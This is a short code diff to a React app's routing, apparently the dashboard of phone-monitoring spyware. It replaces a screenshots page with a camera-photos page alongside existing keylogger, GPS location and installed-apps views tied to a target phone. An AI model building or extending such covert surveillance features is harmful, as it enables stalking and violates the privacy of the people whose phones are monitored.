@@ -13,7 +13,7 @@ import {useState} from "react";
 import {BrowserRouter as Router} from 'react-router-dom';
 import {Routes, Route} from 'react-router-dom';
 import KeyLogger from "./page/KeyLogger";
-import Screenshots from "./page/Screenshots";
+import CameraPhotos from "./page/CameraPhotos";
 
 
 function App() {
@@ -37,7 +37,7 @@ function App() {
                             <Route path="/installed-apps" element={<InstalledApps phone={phone}/>}/>
                             <Route path="/emplacement-gps" element={<Geolocation phone={phone}/>}/>
                             <Route path="/keylogger" element={<KeyLogger phone={phone}/>}/>
-                            <Route path="/screenshots" element={<Screenshots phone={phone}/>}/>
+                            <Route path="/camera-photo" element={<CameraPhotos phone={phone}/>}/>
                         </Routes>
                     </div>
                 </div>
